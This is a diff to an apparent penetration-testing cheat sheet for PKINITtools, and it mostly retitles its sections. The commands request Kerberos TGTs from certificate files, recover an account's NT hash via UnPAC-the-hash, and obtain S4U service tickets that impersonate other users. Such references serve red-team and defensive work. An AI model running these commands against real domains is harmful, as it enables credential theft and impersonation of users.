@@ -4,11 +4,9 @@
 
 ### TGT from PFX
 
-Run TGT from PFX with PKINITtools.
-
 Request a TGT through PKINIT using a PFX certificate and write it as a ccache.
 
-```sh title:"PKINITtools Run TGT from PFX"
+```sh title:"PKINITtools PKINIT TGT from PFX"
 gettgtpkinit.py -cert-pfx "$pfx_file" -pfx-pass "$pfx_pass" "$domain/$target_samname" "$ccache_file"
 ```
 <!-- cheat
@@ -21,11 +19,9 @@ var ccache_file
 
 ### TGT from PEM cert and key
 
-Run TGT from PEM cert and key with PKINITtools.
-
 Request a TGT through PKINIT using separate PEM certificate and key files.
 
-```sh title:"PKINITtools Run TGT from PEM Cert and Key"
+```sh title:"PKINITtools PKINIT TGT from PEM cert and key"
 gettgtpkinit.py -cert-pem "$pem_cert" -key-pem "$pem_key" "$domain/$target_samname" "$ccache_file"
 ```
 <!-- cheat
@@ -38,11 +34,9 @@ var ccache_file
 
 ### TGT with base64 PFX
 
-Run TGT with base64 PFX with PKINITtools.
-
 Request a TGT using a base64-encoded PFX blob.
 
-```sh title:"PKINITtools Run TGT with Base64 PFX"
+```sh title:"PKINITtools PKINIT TGT from base64 PFX"
 gettgtpkinit.py -pfx-base64 "$pfx_base64" -pfx-pass "$pfx_pass" "$domain/$target_samname" "$ccache_file"
 ```
 <!-- cheat
@@ -57,11 +51,9 @@ var ccache_file
 
 ### UnPAC-the-hash
 
-Dump UnPAC the hash with PKINITtools.
-
 Use the AS-REP key printed by `gettgtpkinit.py` to recover the account NT hash from the PKINIT TGT.
 
-```sh title:"PKINITtools Dump UnPAC the Hash"
+```sh title:"PKINITtools Recover NT hash from PKINIT TGT"
 KRB5CCNAME="$ccache_file" getnthash.py -key "$as_rep_key" "$domain/$target_samname"
 ```
 <!-- cheat
@@ -75,11 +67,9 @@ var target_samname
 
 ### S4U ticket from machine ccache
 
-Run S4U ticket from machine ccache with PKINITtools.
-
 Use a machine-account ccache to request an impersonated service ticket.
 
-```sh title:"PKINITtools Run S4U Ticket from Machine Ccache"
+```sh title:"PKINITtools S4U service ticket from machine ccache"
 gets4uticket.py "kerberos+ccache://$domain\\$machine_account:$ccache_file@$dc_fqdn" "$spn@$domain" "$impersonate_user@$domain" "$output_ccache" -v
 ```
 <!-- cheat
@@ -94,11 +84,9 @@ var output_ccache
 
 ### Use S4U ticket
 
-Generate use S4U ticket with PKINITtools.
-
 Export the generated ccache for Kerberos-aware tools.
 
-```sh title:"PKINITtools Generate Use S4U Ticket"
+```sh title:"PKINITtools Use generated S4U ccache"
 export KRB5CCNAME="$output_ccache"
 ```
 <!-- cheat
